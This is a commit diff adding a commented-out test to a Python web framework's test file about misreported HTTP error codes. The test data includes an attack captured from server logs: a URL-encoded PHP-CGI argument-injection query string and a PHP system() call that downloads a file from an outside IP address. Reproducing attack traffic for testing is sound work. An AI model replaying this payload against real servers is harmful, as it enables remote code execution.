05eec1e227a6f4a06a0d4561e896bb40dd260f25
Jay Marcyes <jay@marcyes.com>
2014-11-18 23:42:00 -0800

    nothing much, a commented out test

--- endpoints_test.py
+++ endpoints_test.py
@@ -816,6 +816,38 @@ class CallTest(TestCase):
         self.assertEqual('"this is the body"', res.body)
         self.assertEqual(200, res.code)
 
+#     def test_bad_query_bad_path(self):
+#         """Jarid and I noticed these errors always popping up in the logs, they 
+#         are genuine errors but are misidentified as 417 when they should be 404"""
+#         return
+#         controller_prefix = "badquerybadpath"
+#         r = testdata.create_modules({
+#             controller_prefix: os.linesep.join([
+#                 "from endpoints import Controller",
+#                 "class Default(Controller):",
+#                 "    def GET(self): pass",
+#                 "    def POST(self): pass",
+#                 ""
+#             ])
+#         })
+# 
+#         c = endpoints.Call(controller_prefix)
+#         r = endpoints.Request()
+#         r.method = 'GET'
+#         r.path = '/foo/bar'
+#         #r.query = "%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E"
+#         #r.body = '<?php system("wget 78.109.82.33/apache2-default/.a/hb/php01 -O /tmp/.0e1bc.log'
+#         c.request = r
+# 
+#         res = c.handle()
+#         pout.v(res)
+#         return
+#         info = c.get_callback_info()
+#         pout.v(info)
+# 
+#         # with self.assertRaises(endpoints.CallError):
+# #             info = c.get_callback_info()
+
 
 class VersionCallTest(TestCase):
 
